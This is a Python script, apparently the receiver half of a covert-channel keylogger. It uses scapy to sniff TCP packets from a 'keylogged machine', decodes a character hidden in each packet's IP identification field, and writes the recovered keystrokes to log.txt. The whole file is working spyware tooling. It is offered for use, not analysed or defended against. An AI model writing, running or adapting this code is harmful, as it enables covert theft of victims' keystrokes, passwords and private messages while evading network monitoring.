from scapy.all import sniff, packet
from sys import stderr
import argparse
from ipaddress import ip_address, IPv6Address

parser = argparse.ArgumentParser("./receiver.py")
parser.add_argument("source_host", help="The IPv4 address or hostname of the keylogged machine. The program will only sniff packets coming from this address.")
args = parser.parse_args()

def isValidIPv4(address: str) -> (bool, str):
    try:
        ip = ip_address(address)
        if isinstance(ip, IPv6Address):
            return False, "IPv6 Addresses are not allowed. Only IPv4 addresses will work."
        return True, f"Valid IPv4 Address: {address}"
    except:
        return False, f"Invalid IPv4 Address: {address}"

# Verify arguments
success, reason = isValidIPv4(args.source_host)
if not success:
    print(f"Error: {reason}", file=stderr)
    exit(1)
else:
    print(f"{reason}")

def write_info(pkt):
    with open("log.txt", "a") as f:
        f.write(f"{chr(int(pkt.id / 255))}")

if __name__ == "__main__":
    sniff(filter=f"tcp and src host {args.source_host}", prn=write_info)
    with open("log.txt", "a") as f:
        f.write("\n")
    print("\nData written to ./log.txt")
